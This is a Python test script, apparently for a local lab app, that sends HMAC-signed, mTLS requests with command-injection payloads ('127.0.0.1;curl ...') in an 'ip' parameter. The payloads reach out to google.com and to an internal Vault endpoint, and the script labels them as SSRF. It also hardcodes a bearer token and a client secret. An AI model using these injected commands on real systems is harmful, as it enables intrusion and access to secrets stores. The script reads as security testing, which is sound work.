import requests
import time
import uuid
import hmac
import hashlib
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIGURATION ---
BASE_URL = "https://localhost:8888"
# Thay token vào đây
TOKEN = "eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJIbDVqRUNMbGxic29pTkp1ZUVGV3BaVnlhcldFeGxHNFBKVE54QnloN2tBIn0.eyJleHAiOjE3Nzc5MDQ4ODEsImlhdCI6MTc3NzkwNDU4MSwiYXV0aF90aW1lIjoxNzc3OTA0NTgwLCJqdGkiOiI2Mzg2Nzg5MS1mNTU2LTQ2MDctYjU0OS1lNzZmMGMwZjg4ZjIiLCJpc3MiOiJodHRwczovL2xvY2FsaG9zdDo4NDQ0L3JlYWxtcy9wYXlzaGllbGQtcmVhbG0iLCJzdWIiOiJmMjhkMmIzZi0wM2U4LTRjZDAtOWExNi03Njc3MGNlNjc5ZmQiLCJ0eXAiOiJCZWFyZXIiLCJhenAiOiJwYXlzaGllbGQtYXBwIiwic2Vzc2lvbl9zdGF0ZSI6IjBjNzk3ZTAzLWU1YmQtNGYwYi04ZjJmLTAzZGEyZjBkYTA2YiIsImFjciI6IjEiLCJhbGxvd2VkLW9yaWdpbnMiOlsiaHR0cHM6Ly9vYXV0aC5wc3Rtbi5pbyIsImh0dHBzOi8vbG9jYWxob3N0Ojg4ODgiXSwicmVhbG1fYWNjZXNzIjp7InJvbGVzIjpbIm1hbmFnZXIiXX0sImNuZiI6eyJ4NXQjUzI1NiI6Ikc2QkRiNUZ0TF9sM21XZEhWVFI3ZE81WDZvODNySWpwclljdTFfQmtIREkifSwic2NvcGUiOiJvcGVuaWQgcHJvZmlsZSBlbWFpbCIsInNpZCI6IjBjNzk3ZTAzLWU1YmQtNGYwYi04ZjJmLTAzZGEyZjBkYTA2YiIsImVtYWlsX3ZlcmlmaWVkIjp0cnVlLCJuYW1lIjoiSHVuZyBOZ3V5ZW4iLCJwcmVmZXJyZWRfdXNlcm5hbWUiOiJtYW5hZ2VyLWV4YW1wbGVAcGF5c2hpZWxkLmNvbSIsImdpdmVuX25hbWUiOiJIdW5nIiwiZmFtaWx5X25hbWUiOiJOZ3V5ZW4iLCJlbWFpbCI6Im1hbmFnZXItZXhhbXBsZUBwYXlzaGllbGQuY29tIn0.RP8EK7iVRSBMJd_iM5ukbco6EI-4KGlkASZv99Z_xgitFBd42dBmsooWoq8VhRqEGQRglw5JpH-GJ6jaMfXTnlygsuif0EcLtEiE1D1aCwLpRgK9jnkqKnNcaulGPou6zgJwttaQwshzBkUDDb5OlWOvBoMWSCiRzinVcYlv138bcgShNsc6SKQ7yij_yfjsIpNWsJqT_vlHiPuCunko-DRrQ5-w_wWPOPm_3TN99CyENW340L19hMOaeJhqLQpc7Fl2mErwOZnRBRGM0ndhU0_ihITk5HOZZv64_Wnnt-c9qtYppUk9DOZ8-bNVZ6jTvVF7XU2Gq3AnwI4c3P1knA"
# Thay client secret vào đây
SECRET = "HoHjwBR7aSEJtzQ1DylcppVxZ4CWnVmQ" 

CA = 'kms/ca.crt'
CLIENT = ('kms/client.crt', 'kms/client.key')

def payload(method, uri, ts, nonce, token, secret):
    payload_str = f"{method}|{uri}|{ts}|{nonce}|{token}"
    return hmac.new(secret.encode(), payload_str.encode(), hashlib.sha256).hexdigest()

def send(label, method, uri, use_mtls=True, json_data=None):
    print(f"\n--- {label} ---")
    
    ts = str(int(time.time()))
    nonce = str(uuid.uuid4())
    sig = payload(method, uri, ts, nonce, TOKEN, SECRET)
    
    headers = {
        "Authorization": f"Bearer {TOKEN}",
        "X-Timestamp": ts,
        "X-Nonce": nonce,
        "X-Signature": sig,
        "Content-Type": "application/json"
    }
    
    url = f"{BASE_URL}{uri}"
    print(f"Target: {method} {uri}")
    
    cert = CLIENT if use_mtls else None
    
    try:
        response = requests.request(method, url, headers=headers, json=json_data, cert=cert, verify=False, timeout=7)
        print(f"Status: {response.status_code}")
        preview = response.text[:150] + ("..." if len(response.text) > 150 else "")
        print(f"Response: {preview}")
        
        if response.status_code == 200 and len(response.text) > 0:
            print("[!] POTENTIAL SSRF VULNERABILITY CONFIRMED! <<<")
            
    except requests.exceptions.SSLError as e:
        print(f"❌ SSL Error: Khả năng cao do mTLS bị từ chối - {e}")
    except requests.exceptions.Timeout:
        print("❌ Error: Request Timed Out (Có thể mục tiêu nội bộ không phản hồi)")
    except Exception as e:
        print(f"❌ Error: {e}")

# SCENARIO 1: OOB SSRF 
send(
    label="SCENARIO 1: OOB SSRF", 
    method="GET", 
    uri="/api/employees?ip=127.0.0.1;curl -I https://google.com"
)

# SCENARIO 2: INTERNAL SERVICE 
send(
    label="SCENARIO 2: SSRF TO HASHICORP VAULT", 
    method="GET", 
    uri="/api/employees?ip=127.0.0.1;curl -s -k https://payshield_vault:8200/v1/sys/health"
)

# SCENARIO 3: SSRF WITHOUT mTLS 
send(
    label="SCENARIO 6: SSRF ATTEMPT WITHOUT mTLS", 
    method="GET", 
    uri="/api/employees?ip=127.0.0.1;curl -s -k https://payshield_vault:8200/v1/sys/health",
    use_mtls=False
)   